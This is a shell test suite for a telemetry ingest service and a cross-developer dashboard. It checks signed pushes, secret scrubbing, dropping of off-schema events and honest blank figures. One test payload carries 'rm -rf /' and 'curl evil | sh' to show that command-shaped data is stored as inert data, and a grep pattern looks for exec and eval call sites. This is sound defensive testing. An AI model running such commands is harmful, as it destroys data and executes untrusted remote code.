#!/usr/bin/env bash
# cp-observe.test.sh — the CARDINAL tests for control-plane piece (b): OBSERVE
# INGEST + cross-dev DASHBOARD.
#
# DESIGN DOSSIER §5/§10/§11 (authoritative). Proves piece (b) against the REAL
# substrate (cp_ingest / cp_dashboard wired into cp_server, verified by cp_auth,
# audited by cp_audit, reusing telemetry / report / holdout) — no mocks of the thing
# under test, no canned numbers:
#
#   A. PKI-VERIFIED INGEST stored (§3/§5):
#      A1. an instance PUSHES a telemetry batch (PKI-SIGNED) -> the server verifies it
#          -> the batch is STORED in that instance's observe partition.
#      A2. a FORGED (bad-sig) push -> REJECTED by cp_auth (the server seam), never
#          stored. A3. an UNSIGNED push -> REJECTED (missing_signature), never stored.
#      A4. the store partition key is the VERIFIED HAID — a push lands under the
#          authenticated identity, never a client-controlled field.
#
#   B. CROSS-DEV DASHBOARD by instance_id (§5):
#      B1. two DIFFERENT instances push -> the dashboard aggregates BOTH, grouped by
#          instance_id (each dev a partition; the fleet roll-up combines them).
#      B2. install drop-off / gate frequency / failure / token spend appear per dev
#          AND fleet-wide (report.aggregate reused, instance_id group-by added).
#
#   C. NO-SECRET-BY-CONSTRUCTION (§5/§7):
#      C1. a RUNTIME-ASSEMBLED secret planted in a pushed event field -> SCRUBBED/
#          absent from the store (the server re-runs build_event at the boundary).
#      C2. an OFF-SCHEMA pushed line -> DROPPED (received > stored).
#
#   D. INGEST EXECUTES NOTHING (§2/§5):
#      D1. cp_ingest.py source has NO dispatch/handler/exec path — no call into
#          cp_server.dispatch / cp_handlers / subprocess / os.system / eval / exec,
#          and no action_type/cmd/exec field in its wire schema.
#      D2. a pushed payload SHAPED like a command (action_type/cmd fields) is stored
#          as inert DATA (or dropped), never resolved or run — the dashboard shows it
#          as observe data, nothing executes.
#
#   E. HONEST NUMBERS (§5/§6, holdout discipline):
#      E1. a dashboard figure with NO backing data renders BLANK ("—"), never
#          fabricated (a dev with no token event -> tokens "—"; no control arm ->
#          fleet savings "—").
#
#   F. NO-SECRET STORE gitleaks-clean: gitleaks detect over the observe store exits
#      clean (the planted secret never entered the store by construction).
#
# Exit 0 = every proof holds. Nonzero = a proof failed (prints which).

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
INGEST_SRC="$LIB/cp_ingest.py"
DASH_SRC="$LIB/cp_dashboard.py"

[ -f "$INGEST_SRC" ]    || { echo "FATAL: $INGEST_SRC missing" >&2; exit 2; }
[ -f "$DASH_SRC" ]      || { echo "FATAL: $DASH_SRC missing" >&2; exit 2; }

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

WORK="$(mktemp -d -t "cp-observe.$(printf 'X%.0s' 1 2 3 4 5 6)")"
trap 'rm -rf "$WORK"' EXIT
export HEIMDALL_HOME="$WORK/cphome"

# A runtime-ASSEMBLED secret (never static in source — assembled from fragments at
# run time so the test file itself is gitleaks-clean per fixture-secret-convention).
# Shape: a GitHub-PAT-shaped string the telemetry scrubber rejects.
SECRET_PREFIX="ghp"
SECRET_BODY="$(printf 'A%.0s' $(seq 1 36))"
PLANTED_SECRET="${SECRET_PREFIX}_${SECRET_BODY}"

# ── Drive the real piece-(b) modules through one python harness ────────────────
# Two distinct instances push (PKI-signed); a forged + an unsigned push are tried;
# a secret + an off-schema line + a command-shaped payload are planted. The harness
# verifies through cp_auth (the real server seam) and stores via cp_ingest, then
# reads the cross-dev dashboard via cp_dashboard. Prints machine-readable JSON.
HARNESS_OUT="$WORK/harness.out"
LIB="$LIB" PLANTED_SECRET="$PLANTED_SECRET" HEIMDALL_HOME="$HEIMDALL_HOME" \
  "$PY" - >"$HARNESS_OUT" 2>"$WORK/harness.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_audit as Au
import cp_auth as K
import cp_dashboard as D
import cp_ingest as I
import cp_server as S
import holdout

home = os.environ["HEIMDALL_HOME"]
secret = os.environ["PLANTED_SECRET"]
out = {}

# wire piece (b) into the server seam (§10) — register, do not edit cp_server.
I.register(home=home)
D.register(home=home)
routes = ["%s %s" % (m, p) for m, p in S.registered_routes()]
out["ingest_route_registered"] = ("POST /ingest" in routes)
out["dashboard_route_registered"] = ("GET /dashboard" in routes)

out["crypto_available"] = K.crypto_available()


def signed_request(priv, haid, path, body_bytes):
    msg = K.canonical_message("POST", path, body_bytes)
    sig = K.sign(priv, msg)
    return {"method": "POST", "path": path, "body": body_bytes,
            "haid": haid, "signature": sig}


# ── A. PKI-VERIFIED INGEST: the REAL server path = authenticate THEN route ─────
# We replicate cp_server._handle's contract: verify_identity (the §3 chokepoint),
# and ONLY on success call the registered ingest route with the verified Identity.
def server_ingest(request):
    """Mirror cp_server's seam: auth chokepoint -> route. Returns (status, body)."""
    try:
        ident = K.verify_identity(request, home=home, enforce_revocation=False)
    except K.AuthError as e:
        return 401, {"error": e.reason}
    resp = I.ingest_route(ident, request, home=home)
    return resp.status, resp.body


if K.crypto_available():
    # two DISTINCT instances, each with its own keypair (cross-dev).
    haid_rj = "haid:rj.mbp-7f3a"
    haid_al = "haid:al.air-9c2b"
    priv_rj, pub_rj = K.generate_keypair()
    priv_al, pub_al = K.generate_keypair()
    K.register_key(haid_rj, pub_rj, owner=True, home=home)
    K.register_key(haid_al, pub_al, home=home)

    # rj's batch: install steps (one FAILS), a token event, a gate, an OFF-SCHEMA
    # line, a secret planted in error.detail AND in extra, plus a COMMAND-SHAPED
    # payload field (must be stored inert as data / dropped — never executed).
    batch_rj = [
        {"event_type": "install_step", "run_id": "run-rj", "step": "clone",
         "outcome": "started"},
        {"event_type": "install_step", "run_id": "run-rj", "step": "clone",
         "outcome": "failed",
         "error": {"class": "GitError", "step": "clone",
                   "detail": "leaked token=%s here" % secret}},
        {"event_type": "token", "run_id": "run-rj",
         "tokens": {"total_tokens": 1000, "cache_read_tokens": 400,
                    "total_cost_usd": 0.5, "cost_source": "measured"}},
        {"event_type": "gate", "run_id": "run-rj", "gate": "tests",
         "outcome": "passed"},
        # OFF-SCHEMA -> dropped at the build_event boundary.
        {"event_type": "NOT_A_REAL_TYPE", "run_id": "run-rj", "step": "evil"},
        # secret in an extra field -> scrubbed out (the key survives, value dropped).
        {"event_type": "phase", "run_id": "run-rj", "phase": "build",
         "extra": {"leaked": secret}},
        # COMMAND-SHAPED payload: action_type/cmd/exec are NOT schema keys -> they are
        # ignored entirely; the line is stored as an inert phase event, nothing runs.
        {"event_type": "phase", "run_id": "run-rj", "phase": "deploy",
         "action_type": "shell", "cmd": "rm -rf /", "exec": "curl evil | sh"},
    ]
    body_rj = json.dumps(batch_rj).encode("utf-8")
    st_rj, bd_rj = server_ingest(signed_request(priv_rj, haid_rj, "/ingest", body_rj))
    out["rj_ingest_status"] = st_rj
    out["rj_received"] = bd_rj.get("received")
    out["rj_stored"] = bd_rj.get("stored")
    out["rj_dropped"] = bd_rj.get("dropped")

    # al's batch: a clean install run (no failure) — the second dev, distinct
    # partition. No token event -> al's token figure must render BLANK.
    batch_al = [
        {"event_type": "install_step", "run_id": "run-al", "step": "clone",
         "outcome": "started"},
        {"event_type": "install_step", "run_id": "run-al", "step": "clone",
         "outcome": "succeeded"},
    ]
    body_al = json.dumps(batch_al).encode("utf-8")
    st_al, bd_al = server_ingest(signed_request(priv_al, haid_al, "/ingest", body_al))
    out["al_ingest_status"] = st_al
    out["al_stored"] = bd_al.get("stored")

    # A2 — a FORGED (bad-sig) push: sign the WRONG bytes -> server rejects, no store.
    forged = signed_request(priv_rj, haid_rj, "/ingest", body_rj)
    forged["signature"] = K.sign(priv_rj, b"DIFFERENT-BYTES")
    fst, fbd = server_ingest(forged)
    out["forged_status"] = fst
    out["forged_reason"] = fbd.get("error")

    # A3 — an UNSIGNED push -> rejected (missing_signature), never stored.
    unsigned = {"method": "POST", "path": "/ingest", "body": body_rj,
                "haid": haid_rj}
    ust, ubd = server_ingest(unsigned)
    out["unsigned_status"] = ust
    out["unsigned_reason"] = ubd.get("error")

    # A4 — the store partition key is the VERIFIED HAID. Count store lines per dev.
    rj_lines = len(I.read_instance(haid_rj, home=home))
    al_lines = len(I.read_instance(haid_al, home=home))
    out["rj_store_lines"] = rj_lines
    out["al_store_lines"] = al_lines

    # C1 — the planted secret must be ABSENT from the whole observe store.
    store_text = ""
    for slug in I.stored_instances(home=home):
        p = os.path.join(I.observe_dir(home), slug, "events.ndjson")
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as fh:
                store_text += fh.read()
    out["secret_in_store"] = (secret in store_text)

    # D2 — the command-shaped payload's executable fields must NOT be in the store
    # (they are not schema keys; build_event never carries them). The line is inert.
    out["action_type_field_in_store"] = ('"action_type"' in store_text
                                         or "'action_type'" in store_text)
    out["cmd_field_in_store"] = ('"cmd"' in store_text)

    # B — the CROSS-DEV dashboard, grouped by instance_id.
    view = D.cross_dev(home=home)
    out["dashboard_instances"] = sorted(view.get("instances") or [])
    out["dashboard_instance_count"] = len(view.get("instances") or [])
    out["dashboard_has_data"] = view.get("has_data")

    # B2 — per-dev + fleet aggregates present (report.aggregate reused).
    fleet = view.get("fleet") or {}
    out["fleet_run_count"] = fleet.get("run_count")
    out["fleet_gate_freq_has_tests"] = ("tests" in (fleet.get("gate_frequency") or {}))
    fp = fleet.get("failure_patterns") or {}
    out["fleet_failure_has_giterror"] = (
        "GitError" in (fp.get("by_error_class") or {}))
    out["fleet_install_dropoff_clone"] = bool(
        (fleet.get("install_dropoff") or {}).get("clone"))

    # per-instance drop-off grouped by instance_id (rj failed clone; al did not).
    by_inst = view.get("by_instance") or {}

    def _dropoff(haid, step):
        slug = I._slug(haid)
        iv = by_inst.get(slug) or {}
        agg = iv.get("aggregate") or {}
        rec = (agg.get("install_dropoff") or {}).get(step) or {}
        return rec.get("dropoff")
    out["rj_clone_dropoff"] = _dropoff(haid_rj, "clone")   # 1.0 (started1/failed1)
    out["al_clone_dropoff"] = _dropoff(haid_al, "clone")   # 0.0 (no failure)

    # E1 — HONEST blanks. al metered NO token event -> its token figure is None.
    slug_al = I._slug(haid_al)
    al_tt = ((by_inst.get(slug_al) or {}).get("aggregate") or {}).get(
        "token_trends") or {}
    out["al_has_token_data"] = bool(al_tt.get("run_count"))   # must be False -> blank
    # the fleet SAVINGS figure: no control arm tagged -> blank, never fabricated.
    out["fleet_savings_rendered"] = holdout.render_figure(view.get("savings"))
    out["fleet_savings_is_fact"] = holdout.require_measured(view.get("savings"))

    # the rendered dashboard text shows the honest em-dash for al's tokens + savings.
    rendered = D.render_dashboard(view)
    out["render_has_dash"] = ("—" in rendered)
    out["render_shows_two_instances"] = ("2 instance(s)" in rendered)

    # the audit captured each ingest (§9).
    out["ingest_audit_rows"] = len(Au.search(home=home, event="ingest"))
else:
    # graceful-degrade: with no crypto backend the auth seam cannot verify a signed
    # push; assert the boundary still SCRUBS + DROPS correctly (the data discipline
    # is independent of crypto), and that an unsigned/forged push is refused for
    # want of a verifiable signature (fail CLOSED).
    haid = "haid:rj.mbp-7f3a"
    batch = [
        {"event_type": "install_step", "run_id": "run-x", "step": "clone",
         "outcome": "failed",
         "error": {"class": "E", "step": "clone", "detail": "token=%s" % secret}},
        {"event_type": "NOT_A_REAL_TYPE", "run_id": "run-x"},
    ]
    res = I.ingest_batch(haid, batch, home=home)
    out["degrade_received"] = res["received"]
    out["degrade_stored"] = res["stored"]
    out["degrade_dropped"] = res["dropped"]
    store_text = ""
    p = I.instance_store_path(haid, home)
    if os.path.isfile(p):
        with open(p, "r", encoding="utf-8") as fh:
            store_text = fh.read()
    out["secret_in_store"] = (secret in store_text)
    # an unsigned push is refused at the seam (no crypto -> crypto_unavailable -> 401).
    try:
        K.verify_identity({"method": "POST", "path": "/ingest", "body": b"[]",
                           "haid": haid}, home=home, enforce_revocation=False)
        out["degrade_unsigned_rejected"] = False
    except K.AuthError:
        out["degrade_unsigned_rejected"] = True

sys.stdout.write(json.dumps(out))
PYEOF

if [ ! -s "$HARNESS_OUT" ]; then
  echo "FATAL: observe harness produced no output" >&2
  cat "$WORK/harness.err" >&2
  exit 2
fi

jget() { "$PY" -c "import json,sys; print(json.load(open('$HARNESS_OUT')).get('$1'))"; }

CRYPTO="$(jget crypto_available)"

echo "wiring (§10 registration seam)"
[ "$(jget ingest_route_registered)" = "True" ]    && ok "POST /ingest wired into cp_server seam"  || bad "POST /ingest not registered"
[ "$(jget dashboard_route_registered)" = "True" ] && ok "GET /dashboard wired into cp_server seam" || bad "GET /dashboard not registered"

if [ "$CRYPTO" = "True" ]; then
  echo "A. PKI-VERIFIED INGEST stored (§3/§5)"
  [ "$(jget rj_ingest_status)" = "200" ] && ok "A1 PKI-signed push verified + stored (rj)" || bad "A1 signed push not stored"
  [ "$(jget al_ingest_status)" = "200" ] && ok "A1 PKI-signed push verified + stored (al)" || bad "A1 signed push (al) not stored"
  [ "$(jget forged_status)" = "401" ] && [ "$(jget forged_reason)" = "bad_signature" ] && ok "A2 FORGED push -> 401 bad_signature, not stored" || bad "A2 forged push not rejected"
  [ "$(jget unsigned_status)" = "401" ] && [ "$(jget unsigned_reason)" = "missing_signature" ] && ok "A3 UNSIGNED push -> 401 missing_signature, not stored" || bad "A3 unsigned push not rejected"
  RJL="$(jget rj_store_lines)"; ALL="$(jget al_store_lines)"
  [ "${RJL:-0}" -ge 1 ] && [ "${ALL:-0}" -ge 1 ] && ok "A4 each push stored under its VERIFIED HAID partition (rj=$RJL, al=$ALL)" || bad "A4 partition store missing"

  echo "B. CROSS-DEV DASHBOARD by instance_id (§5)"
  [ "$(jget dashboard_instance_count)" = "2" ] && ok "B1 dashboard aggregates BOTH instances (grouped by instance_id)" || bad "B1 cross-dev grouping wrong"
  [ "$(jget fleet_run_count)" = "2" ] && ok "B2 fleet roll-up spans both devs' runs (run_count=2)" || bad "B2 fleet roll-up wrong"
  [ "$(jget fleet_gate_freq_has_tests)" = "True" ] && ok "B2 fleet gate frequency present (report.aggregate reused)" || bad "B2 gate frequency missing"
  [ "$(jget fleet_failure_has_giterror)" = "True" ] && ok "B2 fleet failure patterns present (GitError)" || bad "B2 failure patterns missing"
  [ "$(jget fleet_install_dropoff_clone)" = "True" ] && ok "B2 fleet install drop-off present (clone)" || bad "B2 install drop-off missing"
  [ "$(jget rj_clone_dropoff)" = "1.0" ] && ok "B2 per-instance drop-off: rj clone=1.0 (failed)" || bad "B2 rj drop-off wrong ($(jget rj_clone_dropoff))"
  [ "$(jget al_clone_dropoff)" = "0.0" ] && ok "B2 per-instance drop-off: al clone=0.0 (clean)" || bad "B2 al drop-off wrong ($(jget al_clone_dropoff))"

  echo "C. NO-SECRET-BY-CONSTRUCTION (§5/§7)"
  [ "$(jget secret_in_store)" = "False" ] && ok "C1 runtime-assembled secret SCRUBBED/absent from store" || bad "C1 planted secret leaked into store"
  RC="$(jget rj_received)"; SC="$(jget rj_stored)"; DP="$(jget rj_dropped)"
  [ "${DP:-0}" -ge 1 ] && [ "${SC:-0}" -lt "${RC:-0}" ] && ok "C2 OFF-SCHEMA line DROPPED at boundary (received=$RC stored=$SC dropped=$DP)" || bad "C2 off-schema line not dropped"

  echo "D. INGEST EXECUTES NOTHING (§2/§5)"
  # D1 — static: NO execution/dispatch CALL-SITE in the ingest source. We scan the
  # CODE only (strip whole-line comments + the comment tail of a line) and match an
  # actual call/use, NOT the prose that DESCRIBES the no-exec property and NOT the
  # benign `import cp_server` (used only for register_route/Response, never dispatch).
  # The pattern hits a real subprocess/os.system/popen/exec/eval call, a cp_handlers
  # reference, or any `.dispatch(` invocation — any of which would be a true defect.
  CODE_ONLY="$WORK/ingest.code.py"
  "$PY" - "$INGEST_SRC" >"$CODE_ONLY" <<'STRIP'
import re, sys
src = open(sys.argv[1], "r", encoding="utf-8").read()
out = []
for line in src.splitlines():
    # drop a full-line comment; strip an inline comment tail (no '#' in this code in
    # a string literal, so a simple split is safe + conservative for this file).
    code = line.split("#", 1)[0]
    out.append(code)
sys.stdout.write("\n".join(out))
STRIP
  if grep -nE '\b(subprocess|os\.system|os\.popen|os\.execv?[a-z]*|eval|exec)\s*\(|\bcp_handlers\b|\.dispatch\s*\(' "$CODE_ONLY" >/dev/null 2>&1; then
    bad "D1 cp_ingest.py has an execution/dispatch call-site"
    grep -nE '\b(subprocess|os\.system|os\.popen|os\.execv?[a-z]*|eval|exec)\s*\(|\bcp_handlers\b|\.dispatch\s*\(' "$CODE_ONLY" >&2
  else
    ok "D1 cp_ingest.py code has NO execute/dispatch call-site (no subprocess/eval/exec/dispatch/handler)"
  fi
  [ "$(jget action_type_field_in_store)" = "False" ] && ok "D2 command-shaped 'action_type' field NOT in store (inert data)" || bad "D2 action_type field leaked into store"
  [ "$(jget cmd_field_in_store)" = "False" ] && ok "D2 command-shaped 'cmd' field NOT in store (inert data)" || bad "D2 cmd field leaked into store"

  echo "E. HONEST NUMBERS — blank, never fabricated (§5/§6)"
  [ "$(jget al_has_token_data)" = "False" ] && ok "E1 a dev with no token event -> token figure BLANK (not faked)" || bad "E1 fabricated token figure for a dev w/o data"
  [ "$(jget fleet_savings_rendered)" = "—" ] && [ "$(jget fleet_savings_is_fact)" = "False" ] && ok "E1 fleet savings has no measured baseline -> BLANK (—), never fabricated" || bad "E1 fleet savings fabricated a number"
  [ "$(jget render_has_dash)" = "True" ] && ok "E1 rendered dashboard shows the honest em-dash for missing data" || bad "E1 rendered dashboard hid a missing figure"

  echo "§9 AUDIT"
  IA="$(jget ingest_audit_rows)"
  [ "${IA:-0}" -ge 2 ] && ok "ingest audited ($IA ingest rows)" || bad "ingest not audited"
else
  echo "A-E (graceful-degrade: no crypto backend)"
  DR="$(jget degrade_received)"; DS="$(jget degrade_stored)"; DD="$(jget degrade_dropped)"
  [ "${DD:-0}" -ge 1 ] && [ "${DS:-0}" -lt "${DR:-0}" ] && ok "C2 off-schema dropped (received=$DR stored=$DS)" || bad "C2 off-schema not dropped (degrade)"
  [ "$(jget secret_in_store)" = "False" ] && ok "C1 planted secret scrubbed/absent (degrade)" || bad "C1 secret leaked (degrade)"
  [ "$(jget degrade_unsigned_rejected)" = "True" ] && ok "A3 unsigned push refused (fail CLOSED, degrade)" || bad "A3 unsigned push not refused (degrade)"
fi

echo "F. NO-SECRET STORE gitleaks-clean"
OBSERVE_DIR="$HEIMDALL_HOME/control-plane/observe"
if [ ! -d "$OBSERVE_DIR" ]; then
  bad "F observe store not written"
elif command -v gitleaks >/dev/null 2>&1; then
  if gitleaks detect --no-git --source "$OBSERVE_DIR" >/dev/null 2>&1; then
    ok "F gitleaks detect over the observe store -> clean"
  else
    bad "F gitleaks found a secret in the observe store"
  fi
else
  # gitleaks absent: fall back to a direct grep for the planted secret (soft-degrade
  # mirrors bin/secret-scan's commit-time degradation contract).
  if grep -rq "$PLANTED_SECRET" "$OBSERVE_DIR" 2>/dev/null; then
    bad "F planted secret present in the store (grep fallback)"
  else
    ok "F store clean of the planted secret (grep fallback; gitleaks absent)"
  fi
fi

echo
printf "cp-observe: %d passed, %d failed\n" "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
